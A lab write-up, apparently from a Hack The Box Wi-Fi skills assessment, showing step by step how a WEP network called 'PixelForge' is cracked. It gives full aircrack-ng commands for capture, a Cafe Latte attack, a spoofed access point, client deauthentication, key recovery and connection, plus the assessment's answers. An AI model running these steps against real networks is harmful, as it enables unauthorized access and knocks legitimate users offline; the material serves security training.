---
title: WEP Attacks Skills Assessment
description: WEP Attacks Skills Assessment
date: '2026-09-23'
tags:
  - HTB
  - Skills Assessment
  - Pentesting
  - Wi-Fi
published: true
slug: wep-attacks-skills-assessment
category: Wi-Fi
platform: Hack The Box
difficulty: Easy
---
# WEP Attacks: Skills Assessment

A walkthrough of cracking a WEP-secured network using the aircrack-ng suite, from initial recon through to full connection.

**Target network:** `PixelForge`
**BSSID:** `B2:A6:3D:EB:23:A3`
**Client:** `36:F6:7E:23:60:A8`

---

## 1. Reconnaissance

The first step in any wireless attack is putting the adapter into monitor mode. This lets it capture raw 802.11 frames instead of only traffic addressed to it.

```bash
airmon-ng start wlan0
```

With monitor mode active, scan for nearby networks:

```bash
airodump-ng wlan0mon
```

Output:

```
 CH  1 ][ Elapsed: 1 min ][ 2026-09-23 18:43 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:A6:3D:EB:23:A3  -47 100      806        2    0   1   11   WEP  WEP         PixelForge                     

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:A6:3D:EB:23:A3  36:F6:7E:23:60:A8  -29    0 - 1      0        4         PixelForge                         
Quitting...
```

**Question:** What is the SSID of the network?
**Answer:** `PixelForge`, visible directly in the scan output.

---

## 2. Choosing an attack: Cafe Latte

With the network identified, the next goal is recovering the WEP key. There are a few ways to do this depending on how much traffic is flowing, but at this point it wasn't clear whether the associated client was actually generating any. Rather than wait and hope, the Cafe Latte attack was the better choice. It works by targeting the client directly rather than the access point, tricking it into generating the ARP traffic needed to crack the key even without a live connection to the real network.

This requires four terminals running in parallel.

### Step 1: Capture traffic on the target channel

```bash
airodump-ng wlan0mon -c 1 -w WEP
```

Locking to channel 1 and writing to a capture file (`WEP`) keeps the data focused on this one network instead of everything nearby.

### Step 2: Start the Cafe Latte listener

```bash
aireplay-ng -6 -D -b B2:A6:3D:EB:23:A3 -h 36:F6:7E:23:60:A8 wlan0mon
```

This begins the Cafe Latte process against the client, using its MAC address to draw out encrypted packets.

### Step 3: Stand up a fake access point

```bash
airbase-ng -c 1 -a B2:A6:3D:EB:23:A3 -e "PixelForge" wlan0mon -W 1 -L
```

Spoofing the real BSSID and SSID gives the client something to talk to, which is what makes the ARP requests worth capturing.

### Step 4: Deauthenticate the client

```bash
aireplay-ng -0 10 -a B2:A6:3D:EB:23:A3 -c 36:F6:7E:23:60:A8 wlan0mon
```

Sending 10 deauth packets forces the client to disconnect and reassociate, which is often the push needed to generate fresh traffic.

### Step 5: Crack the key

Once enough data packets have accumulated in the capture file, stop airodump-ng and run:

```bash
aircrack-ng -b B2:A6:3D:EB:23:A3 WEP-01.cap
```

Result:

```
KEY FOUND! [ 1B:2A:5A:4C:6A ]
```

---

## 3. Connecting to the network

With the key in hand, the last step is turning it into a working connection.

First, monitor mode needs to come off so the adapter goes back to normal operation:

```bash
sudo airmon-ng stop wlan0mon
```

### Format the key

Aircrack-ng prints the key with colons, like `1B:2A:5A:4C:6A`. wpa_supplicant wants it without them, so the colons just get stripped:

```
1B2A5A4C6A
```

### Build a config file

Save the following as `wep.conf`:

```
network={
    ssid="PixelForge"
    key_mgmt=NONE
    wep_key0=1B2A5A4C6A
    wep_tx_keyidx=0
}
```

### Connect

```bash
sudo wpa_supplicant -c wep.conf -i wlan0
```

### Get an IP address

```bash
sudo dhclient wlan0
```

With an IP assigned, navigating to the router's admin page confirms the connection worked:

```
http://192.168.1.1
```

Result:

```
REDACTED
```
